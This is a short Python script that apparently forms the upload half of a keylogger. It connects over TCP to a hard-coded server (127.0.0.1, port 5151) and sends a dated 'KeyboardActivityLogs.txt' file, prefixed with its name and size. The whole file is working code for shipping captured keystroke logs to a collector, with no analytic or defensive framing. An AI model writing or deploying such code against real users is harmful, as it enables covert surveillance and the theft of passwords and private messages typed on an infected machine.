import socket
import os
import datetime

SERVER = "127.0.0.1"
PORT = 5151
FILE_NAME = ""
FILE_SIZE = None
SOCKET_OBJ = None
SEP = b"|||"
FILE_DATA = b""

def generate_file_name():
    global FILE_NAME
    date_today = datetime.date.today()
    FILE_NAME = str(date_today) + "-KeyboardActivityLogs.txt"

def initiate_socket():
    global SOCKET_OBJ
    SOCKET_OBJ = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    SOCKET_OBJ.connect((SERVER, PORT))
    
def prepare_file():
    global FILE_SIZE, FILE_DATA
    FILE_SIZE = os.path.getsize(FILE_NAME) # file size in bytes
    FILE_DATA += bytes(FILE_NAME.encode()) 
    FILE_DATA += SEP
    FILE_DATA += bytes(str(FILE_SIZE).encode())
    FILE_DATA += SEP

def transfer_file(): 
    global FILE_DATA
    with open(FILE_NAME, "rb") as file:
        FILE_DATA += file.read()
        SOCKET_OBJ.sendall(FILE_DATA)
    close_connection()

def close_connection():
    SOCKET_OBJ.close()

if __name__ == "__main__":
    generate_file_name()
    initiate_socket()
    try:
        prepare_file()
        transfer_file()
    except Exception as e:
        close_connection()
        print(e)
        print("** File Transfer NOT successful **")    